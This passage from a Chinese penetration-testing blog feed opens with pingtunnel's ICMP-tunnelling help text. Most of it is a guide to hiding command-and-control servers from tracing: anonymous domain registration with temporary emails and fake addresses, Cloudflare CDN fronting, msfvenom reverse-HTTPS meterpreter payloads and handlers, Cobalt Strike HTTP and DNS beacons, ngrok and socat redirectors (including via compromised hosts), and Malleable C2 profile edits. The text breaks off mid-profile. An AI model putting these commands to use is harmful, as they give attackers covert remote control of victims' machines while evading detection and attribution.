class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># ./pingtunnel -h</span><br><br>通过伪造ping，把tcp/udp/sock5流量通过远程服务器转发到目的服务器上。用于突破某些运营商封锁TCP/UDP流量。<br><br>Usage:<br><br>    <span class="hljs-comment">// server</span><br>    pingtunnel -type <span class="hljs-keyword">server</span><br><br>    <span class="hljs-comment">// client, Forward udp</span><br>    pingtunnel -type <span class="hljs-keyword">client</span> -l LOCAL_IP:<span class="hljs-number">4455</span> -s SERVER_IP -t SERVER_IP:<span class="hljs-number">4455</span><br><br>    <span class="hljs-comment">// client, Forward tcp</span><br>    pingtunnel -type <span class="hljs-keyword">client</span> -l LOCAL_IP:<span class="hljs-number">4455</span> -s SERVER_IP -t SERVER_IP:<span class="hljs-number">4455</span> -tcp <span class="hljs-number">1</span><br><br>    <span class="hljs-comment">// client, Forward sock5, implicitly open tcp, so no target server is needed</span><br>    pingtunnel -type <span class="hljs-keyword">client</span> -l LOCAL_IP:<span class="hljs-number">4455</span> -s SERVER_IP -sock5 <span class="hljs-number">1</span><br><br>    -type     服务器或者客户端<br><br>服务器参数<span class="hljs-keyword">server</span> param:<br>    -key      设置的密码，默认<span class="hljs-number">0</span><br>    -nolog    不写日志文件，只打印标准输出，默认<span class="hljs-number">0</span><br>    -noprint  不打印屏幕输出，默认<span class="hljs-number">0</span><br>    -loglevel 日志文件等级，默认info<br>    -maxconn  最大连接数，默认<span class="hljs-number">0</span>，不受限制<br>    -maxprt   <span class="hljs-keyword">server</span>最大处理线程数，默认<span class="hljs-number">100</span><br>    -maxprb   <span class="hljs-keyword">server</span>最大处理线程buffer数，默认<span class="hljs-number">1000</span><br>    -conntt   <span class="hljs-keyword">server</span>发起连接到目标地址的超时时间，默认<span class="hljs-number">1000</span>ms<br><br>客户端参数<span class="hljs-keyword">client</span> param:<br>    -l        本地的地址，发到这个端口的流量将转发到服务器<br>    -s        服务器的地址，流量将通过隧道转发到这个服务器<br>    -t        远端服务器转发的目的地址，流量将转发到这个地址<br>    -timeout  本地记录连接超时的时间，单位是秒，默认<span class="hljs-number">60</span>s<br>    -key      设置的密码，默认<span class="hljs-number">0</span><br>    -tcp      设置是否转发tcp，默认<span class="hljs-number">0</span><br>    -tcp_bs   tcp的发送接收缓冲区大小，默认<span class="hljs-number">1</span>MB<br>    -tcp_mw   tcp的最大窗口，默认<span class="hljs-number">20000</span><br>    -tcp_rst  tcp的超时发送时间，默认<span class="hljs-number">400</span>ms<br>    -tcp_gz   当数据包超过这个大小，tcp将压缩数据，<span class="hljs-number">0</span>表示不压缩，默认<span class="hljs-number">0</span><br>    -tcp_stat 打印tcp的监控，默认<span class="hljs-number">0</span><br>    -nolog    不写日志文件，只打印标准输出，默认<span class="hljs-number">0</span><br>    -noprint  不打印屏幕输出，默认<span class="hljs-number">0</span><br>    -loglevel 日志文件等级，默认info<br>    -sock5    开启sock5转发，默认<span class="hljs-number">0</span><br>    -profile  在指定端口开启性能检测，默认<span class="hljs-number">0</span>不开启<br>    -s5filter sock5模式设置转发过滤，默认全转发，设置CN代表CN地区的直连不转发<br>    -s5ftfile sock5模式转发过滤的数据文件，默认读取当前目录的GeoLite2-Country.mmdb<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>流量隐藏</title>
    <link href="/2024/01/30/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/"/>
    <url>/2024/01/30/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>流量隐藏是实战中最重要的</p><h1 id="域名上线隐藏IP"><a href="#域名上线隐藏IP" class="headerlink" title="域名上线隐藏IP"></a>域名上线隐藏IP</h1><h2 id="隐藏ip的重要性"><a href="#隐藏ip的重要性" class="headerlink" title="隐藏ip的重要性"></a>隐藏ip的重要性</h2><p>在使用MSF或者CS获得目标机Sessions或者Beacon时，如果直接使用自己的VPS作为MSF或CS的服  务器时，容易被溯源到攻击者所在VPS主机IP。    </p><h2 id="域名上线原理"><a href="#域名上线原理" class="headerlink" title="域名上线原理"></a>域名上线原理</h2><p>当我们访问域名时会经过域名解析，域名解析就是将域名转换到IP地址的过程，我们通过域名访问服  务器，实际上是访问的目标服务器IP地址  </p><ul><li><p>A记录</p><p>将域名指向一个IPv4地址（例如：100.100.100.100），需要增加A记录</p></li><li><p>CNAME记录： </p><p>如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记  录。这个域名一般是主机服务商提供的一个域名  </p></li><li><p>MX记录： </p><p>建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根  据邮箱服务商提供的MX记录填写此记录  </p></li><li><p>NS记录</p><p>域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录</p></li><li><p>TXT记录</p><p>可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 </p></li><li><p>AAAA记录</p><p>将主机名（或域名）指向一个IPv6地址（例如：ff03:0:0:0:0:0:0:c1），需要添加AAAA  记录</p></li></ul><h1 id="CDN简介"><a href="#CDN简介" class="headerlink" title="CDN简介"></a>CDN简介</h1><p>CDN 的全称是 Content  Delivery Network，即内容分发网络。其目的是通过在现有的Internet中  增加一层新的CACHE(缓存)层，将网站的内容发布到最接近用户的网络”边缘“的节点，目的提高用户访  问网站的先赢速度  </p><p>使用CDN内容分发网络的多节点分布式技术，通过 “加速、代理、缓存” 隐藏在后面的静态文件或服  务；最终实现对外暴露的是CDN多节点的公网域名IP，很难甚至无法溯源真实后端服务器的域名或  IP！  </p><p>假设您的业务源站域名为 <a href="http://www.test.com/">www.test.com</a> ，当域名接入 CDN 开始使用加速服务后，您的用户发起  HTTP 请求，实际的处理流程如图所示，根据他的处理流程，CDN 最后会将流量转发到真实IP上，那  么我们便能通过CDN达到隐藏自身的效果  </p><h1 id="域名-CDN配置"><a href="#域名-CDN配置" class="headerlink" title="域名+CDN配置"></a>域名+CDN配置</h1><h2 id="关于备案"><a href="#关于备案" class="headerlink" title="关于备案"></a>关于备案</h2><ol><li><p>无需备案</p><p>注册国外域名，但是暂时不打算启用建站，那么无需备案;  </p><p>注册国外域名，域名指向到国外网站空间或者是放置在特别行政区，如香港，也无需备案。</p></li><li><p>需要备案</p><p>注册国内域名，要备案后才能使用。  </p><p>注册国外域名，但是绑定国内的服务器空间，也需要备案才能使用</p></li></ol><h2 id="注册域名"><a href="#注册域名" class="headerlink" title="注册域名"></a>注册域名</h2><ol><li><p>国外域名注册商 NameSilo</p><blockquote><p> <a href="https://www.namesilo.com/">https://www.namesilo.com/</a>  </p></blockquote><p>注册账号： <a href="https://www.namesilo.com/login">https://www.namesilo.com/login</a></p><p>建议使用临时邮箱</p><p>美国地址生成器：  <a href="https://www.meiguodizhi.com/">https://www.meiguodizhi.com/</a>  </p></li><li><p>搜索域名  </p><p>网站首页，输入查询的域名  </p><p>便宜域名后缀：.info、.top、.xyz、.fun 等等  </p></li><li><p>购买域名  </p><p>优惠码</p><blockquote><p><a href="https://www.uphezi.com/namesilo-coupon/?wpcd_coupon=2828">https://www.uphezi.com/namesilo-coupon/?wpcd_coupon=2828</a></p></blockquote></li><li><p>管理域名</p><blockquote><p>  <a href="https://www.namesilo.com/account_domains.php">https://www.namesilo.com/account_domains.php</a>  </p></blockquote></li><li><p>注册免费CDN服务</p><ul><li>登录注册账号</li></ul><blockquote><p>  <a href="https://www.cloudflare.com/zh-cn/">https://www.cloudﬂare.com/zh-cn/</a>  </p></blockquote><ul><li><p>配置域名使用CDN添加站点  </p><p>主页，添加站点，输入前面购买的域名。</p></li></ul><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219091629305.png" alt="image-20240219091629305"></p><ul><li>选择免费计划</li></ul><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219091653961.png" alt="image-20240219091653961"></p><ul><li><p>完成名称服务器设置  </p><p>配置域名的 NameServer 域名解析服务  </p><p>进入我的域名：<a href="https://www.namesilo.com/account_domains.php">https://www.namesilo.com/account_domains.php</a>  </p><p>选择 Change  Nameservers：  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219091802079.png" alt="image-20240219091802079"></p><p>修改为 Cloudflare 上得到的 nameserver ：  </p></li><li><p>返回 Cloudflare 检查名称服务器</p></li></ul><p>  大概需要等待 10-20 分钟左右的时间，设置成功后， Cloudflare 会发送邮件。  </p><p>  配置 NameServer 更换解析服务器的原因就是，将 baidus.top 域名的所有解析功能都托管在  Cloudflare，这样 Cloudflare 就可以提供 CDN 的解析功能！  </p><ul><li><p>配置CDN域名解析  </p><p>DNS配置  </p><p>直接配置使用CDN代理模式进行域名解析提供服务  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219092416458.png" alt="image-20240219092416458"></p></li><li><p>自动配置全部选择关闭 </p><p>  概述 -&gt; 快速入门指南  </p></li><li><p>配置 SSL&#x2F;TLS 加密方式  </p><p>  SSL&#x2F;TLS -&gt; 关闭(不安全)  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219093031742.png" alt="image-20240219093031742"></p><p>Cloudflare 的 CDN，http、https代理模式有个特点，如果用其他端口的话，是监听不到的！  </p><p>Cloudflare支持的HTTP端口是：  </p><blockquote><p>  80,8080,8880,2052,2082,2086,2095  </p></blockquote><p>Cloudflare支持的HTTPS端口是：  </p><blockquote><p>  443,2053,2083,2087,2096,8443  </p></blockquote><p>到此域名+CDN全部搞定！开始测试！</p></li></ul></li></ol><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>云服务器安装metasploit  </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/rapid7/m</span>etasploit-omnibus<span class="hljs-regexp">/master/</span>config<span class="hljs-regexp">/templates/m</span>etasploit-framework-wrappers<span class="hljs-regexp">/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./m</span>sfinstall<br><br></code></pre></td></tr></table></figure><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_http <span class="hljs-attribute">LHOST</span>=shop.xxx.top <span class="hljs-attribute">LPORT</span>=2095 -f exe -o2095.exe<br></code></pre></td></tr></table></figure><p>注意生成的payload 的lhost 必须是域名，不然无法隐藏ip  端口一定要是上面提到的那些端口</p><p>MSF开启监听</p><p>可以直接使用handler 开启监听</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost shop.xxx.top<br><span class="hljs-built_in">set</span> reverselistenerbindaddress 192.168.0.141<br><span class="hljs-built_in">set</span> lport 2095<br>run<br></code></pre></td></tr></table></figure><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><ul><li><p>生成HTTPS证书  </p><p>去 Cloudflare 的 SSL&#x2F;TLS &gt; 源服务器 创建证书，使用默认配置生成pem和key。</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219094331956.png" alt="image-20240219094331956"></p><p>点击创建，生成源证书和私钥证书：    </p><p>保存源证书内容为 cloudflare.pem，保存私钥内容为 cloudflare.key，将创建的pem和key文件  </p><p>上传至云服务器。  </p><p>创建一个包含源证书内容和私钥内容的统一证书文件；使用 cat 命令：</p><blockquote><p>  cat cloudflare.key  cloudflare.pem &gt;&gt; &#x2F;root&#x2F;cloudflare-key.pem  </p></blockquote></li><li><p>设置监听器</p><p>设置 StagerVerifySSLCert 为 true ，表示启用 SSL 验证，同时设置 EnableStageEncoding 来对第二阶段的有效载荷进行编码（分阶段Payload）。  </p><p>设置 SSLVersion 为 cloudflare 中指定的最低TLS版本，默认为 TLS1  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219094731006.png" alt="image-20240219094731006"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter_reverse_https<br><span class="hljs-built_in">set</span> LHOST www.mingy.xyz<br><span class="hljs-built_in">set</span> LPORT 443<br><span class="hljs-built_in">set</span> HandlerSSLCert /root/cloudflare-key.pem   # 证书位置<br><span class="hljs-built_in">set</span> StagerVerifySSLCert <span class="hljs-literal">true</span>  # 用于小马拉大马的时候使用<br><span class="hljs-built_in">set</span> EnableStageEncoding <span class="hljs-literal">true</span><br><span class="hljs-built_in">set</span> SSLVersion TLS1<br><span class="hljs-built_in">run</span><br><br></code></pre></td></tr></table></figure><p>浏览器访问 <a href="https://yourdomain/">https://yourdomain</a> ，看到 https 锁和 It works ，表示证书配置成功  </p></li><li><p>生成Payload</p></li></ul><p>  注意生成大马会好很多，因为小马网络问题可能连接不上</p>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter_reverse_https <span class="hljs-attribute">LHOST</span>=www.mingy.xyz <span class="hljs-attribute">LPORT</span>=443 -f exe -o r443.exe<br></code></pre></td></tr></table></figure><ul><li><p>上线会话</p><p>  在目标机执行生成的 Payload ，成功收到返回的会话</p></li></ul><h1 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h1><h2 id="Beacon-HTTP"><a href="#Beacon-HTTP" class="headerlink" title="Beacon HTTP"></a>Beacon HTTP</h2><ol><li><p>配置Listener</p><p>HTTP Host Header，必须填写你的域名！这是CDN技术的原理要求</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219101722344.png" alt="image-20240219101722344"></p><p>这里必须都要配置为 cloudflare 对应的Port</p></li><li><p>生成Payload</p><p>使用上一步配置的监听器，创建windows可执行 Payload，目标主机运行 payload，主机可以成功上线</p></li></ol><h2 id="Beacon-DNS"><a href="#Beacon-DNS" class="headerlink" title="Beacon DNS"></a>Beacon DNS</h2><p>这个方式不会被 流量检测设备识别到</p><p>因为都不会拦截DNS 的流量</p><h3 id="Cloudflare添加域名"><a href="#Cloudflare添加域名" class="headerlink" title="Cloudflare添加域名"></a>Cloudflare添加域名</h3><ol><li><p>到 <a href="https://dash.cloudflare.com/">https://dash.cloudﬂare.com/</a><a href="https://dash.cloudflare.com/"> </a>注册并登录</p></li><li><p>添加站点，选择域名添加：xxx.com</p></li><li><p>添加A记录，设置为VPS的IP地址  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219102212731.png"></p><p>这个记得不能设置cdn 代理</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">A ds <span class="hljs-number">123</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span><br></code></pre></td></tr></table></figure></li><li><p>添加NS记录，设置为A记录对应的域名  </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">NS ns1 <span class="hljs-keyword">ds</span>.xxx.<span class="hljs-keyword">com</span><br>NS ns2 <span class="hljs-keyword">ds</span>.xxx.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><p>创建<strong>DNS</strong>监听器</p><blockquote><p>Name: dns  </p><p>Payload: Beacon DNS  DNS Hosts:  </p><p>ns1.xxx.com  </p><p>ns2.xxx.com  </p><p>DNS Host(Stager): ns1.xxx.com</p></blockquote></li><li><p>CS生成Payload</p><p>该方式只能生成32位信息，而且回显是非常卡，上线也非常卡</p><p>  生成Payload执行上线，Beacon上线后没有信息显示，右键进入Beacon通过执行chekin命令让DNS  Beacon强制回连Teamserver  </p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">Use: mode [dns|<span class="hljs-type">dns6</span>|<span class="hljs-type">dns</span>-txt]<br>设置Beacon的数据交换模式，仅对DNS Beacon有用<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219102949698.png" alt="image-20240219102949698"></p></li></ol><h1 id="转发代理"><a href="#转发代理" class="headerlink" title="转发代理"></a>转发代理</h1><p>利用内网穿透，将C2回连端口映射到其他公网地址，以达到测试程序通过其他公网地址进行回连，隐藏C2真实IP </p><p>如果是使用vps 那么处理就是转发，并不是内网穿透 </p><p>这个也是白名单</p><h2 id="注册ngrok账号"><a href="#注册ngrok账号" class="headerlink" title="注册ngrok账号"></a>注册ngrok账号</h2><blockquote><p>  <a href="https://ngrok.com/">https://ngrok.com/</a>  </p></blockquote><h2 id="下载相应版本客户端"><a href="#下载相应版本客户端" class="headerlink" title="下载相应版本客户端"></a>下载相应版本客户端</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219103356439.png" alt="image-20240219103356439"></p><p>运行这两条命令</p><h2 id="配置通道"><a href="#配置通道" class="headerlink" title="配置通道"></a>配置通道</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">ngrok</span> tcp <span class="hljs-keyword">port</span>(填写具体的port)<br>ngrog tcp 9999<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219104627248.png" alt="image-20240219104627248"></p><h2 id="使用cs-创建监听"><a href="#使用cs-创建监听" class="headerlink" title="使用cs 创建监听"></a>使用cs 创建监听</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219104846749.png" alt="image-20240219104846749"></p><h2 id="模拟上线"><a href="#模拟上线" class="headerlink" title="模拟上线"></a>模拟上线</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219105144415.png" alt="image-20240219105144415"></p><p>发现ngrok 有流量经过</p><h1 id="转发重定向"><a href="#转发重定向" class="headerlink" title="转发重定向"></a>转发重定向</h1><p>使用一个机器作为跳板机或者肉机，然后转发请求</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219105937743.png" alt="image-20240219105937743"></p><p>缺点就是需要多台vps </p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>受害者只与那台做重定向的机器通信，重定向机器只会转发来自 beacon 的特定流量到C2控制端主机  具体实现：一台VPS作为转发器，一台VPS作为 Teamserver  </p><blockquote><p>  转发机器：47.104.255.11  Teamserver：124.71.45.28  </p></blockquote><h2 id="Socat转发"><a href="#Socat转发" class="headerlink" title="Socat转发"></a>Socat转发</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">socat</span> TCP4-LISTEN:<span class="hljs-number">80</span>,fork TCP4:C2ip:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>  常用选项  </p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-lh 将主机名添加到日志消息</span><br><span class="hljs-deletion">-v 详细数据流量，文本</span><br><span class="hljs-deletion">-x 详细数据流量，十六进制</span><br><span class="hljs-deletion">-d 增加详细程度（最多使用4次；建议使用2次）</span><br><span class="hljs-deletion">-lf &lt;logfile&gt; 记录到文件</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">socat -d -d -d -d -<span class="hljs-keyword">lh</span> -v -<span class="hljs-keyword">lf</span> /var/<span class="hljs-built_in">log</span>/socat.<span class="hljs-built_in">log</span> TCP4-LISTEN:<span class="hljs-number">80</span>,fork TCP4:C2服务器ip:C2服务器监听Port<br></code></pre></td></tr></table></figure><blockquote><p>  将此机器801端口接受到的流量转发给 124.71.45.28:7788  </p></blockquote><p>创建监听器</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219110304285.png" alt="image-20240219110304285"></p><p>这个地方使用跳板机的ip地址，和对应的端口</p><h2 id="多层转发"><a href="#多层转发" class="headerlink" title="多层转发"></a>多层转发</h2><blockquote><p>socat -d -d -d -d -lh -v -lf  &#x2F;var&#x2F;log&#x2F;socat.log TCP4-LISTEN:801,fork TCP4:120.27.61.239:801  </p></blockquote><blockquote><p>socat -d -d -d -d -lh -v -lf  &#x2F;var&#x2F;log&#x2F;socat.log TCP4-LISTEN:801,fork TCP4:124.71.45.28:7788</p></blockquote><h1 id="CS流量隐藏"><a href="#CS流量隐藏" class="headerlink" title="CS流量隐藏"></a>CS流量隐藏</h1><h2 id="CS配置文件Profile"><a href="#CS配置文件Profile" class="headerlink" title="CS配置文件Profile"></a>CS配置文件Profile</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219111028138.png" alt="image-20240219111028138"></p><p>点击创建，生成源证书和私钥证书：  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219111100286.png" alt="image-20240219111100286"></p><p>保存源证书内容为 cloudflare.pem，保存私钥内容为 cloudflare.key  </p><p>将创建的pem和key文件上传至云服务器。执行以下命令（<a href="http://www.xxx.㯘/">www.xxx.com</a>-xh5fo22au1gd09dxqc321f&#x2F;)为申请的域名）  </p><blockquote><p>openssl pkcs12 -export -in xxxx.pem -inkey xxxx.key -out <a href="http://www.xxx.com.p12/">www.xxx.com.p12</a> -name <a href="http://www.xxx.com/">www.xxx.com</a> -passout pass:123456</p><p>keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore <a href="http://www.xxx.com.store/">www.xxx.com.store</a> -srckeystore <a href="http://www.xxx.com.p12/">www.xxx.com.p12</a> -srcstoretype PKCS12 -srcstorepass 123456 -alias <a href="http://www.xxx.com/">www.xxx.com</a></p></blockquote><p>将生成的 keystore 文件放在云服务器CS的根目录下。  </p><p>然后对 4.7 版本 Profile 进行修改。将keystore文件名称和密码填入profile文件中。</p><p>需要修改的内容主要有4处：  </p><ul><li><p>https-certificate</p><p>修改模块中的 keystore 和 password，并去掉 # 注释  </p><blockquote><p>  <strong>set</strong> keystore <em>“shop.baidus.top.store”</em>  <strong>set</strong> <em>password “123456”</em>;  </p></blockquote></li><li><p>http-stager</p><p>把 Server 配置如下内容</p><blockquote><p>  header “Content-Type” “application&#x2F;javascript;  charset&#x3D;utf-8”<em>;</em>  </p></blockquote><p>修改为</p><blockquote><p>  header “Content-Type” “application&#x2F;<em>;  charset&#x3D;utf-8”</em>;*  </p></blockquote><p>  修改 Client 配置中的 Host 和 Referer：  </p><pre><code class="hljs">client &#123;    header &quot;Accept&quot; &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;;    header &quot;Accept-Language&quot; &quot;en-US,en;q=0.5&quot;;    header &quot;Host&quot; &quot;shop.baidus.top&quot;;    header &quot;Referer&quot; &quot;http://shop.baidus.top/&quot;;    header &quot;Accept-Encoding&quot; &quot;gzip, deflate&quot;;&#125;</code></pre></li><li><p>http-get  </p><p>修改 Client 配置中的 Host 和 Referer：</p></li></ul>  <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs abnf">client &#123;<br>  <br>    header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;shop.baidus.top&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://shop.baidus.top/&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span><span class="hljs-comment">;</span><br>  <br>    metadata &#123;<br>        base64url<span class="hljs-comment">;</span><br>        prepend <span class="hljs-string">&quot;__cfduid=&quot;</span><span class="hljs-comment">;</span><br>        header <span class="hljs-string">&quot;Cookie&quot;</span><span class="hljs-comment">;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>  修改Server</p><blockquote><p>header “Content-Type” “application&#x2F;javascript; charset&#x3D;utf-8”;</p></blockquote><p>  为</p><blockquote><p>header “Content-Type” “application&#x2F;*; charset&#x3D;utf-8”;</p></blockquote><ul><li>http-post</li></ul><p>  修改 Client 配置中的 Host 和 Referer：  </p>  <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs abnf">client &#123;<br>  <br>    header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Host&quot;</span> <span class="hljs-string">&quot;shop.baidus.top&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Referer&quot;</span> <span class="hljs-string">&quot;http://shop.baidus.top/&quot;</span><span class="hljs-comment">;</span><br>    header <span class="hljs-string">&quot;Accept-Encoding&quot;</span> <span class="hljs-string">&quot;gzip, deflate&quot;</span><span class="hljs-comment">;</span><br>  <br>    id &#123;<br>        mask<span 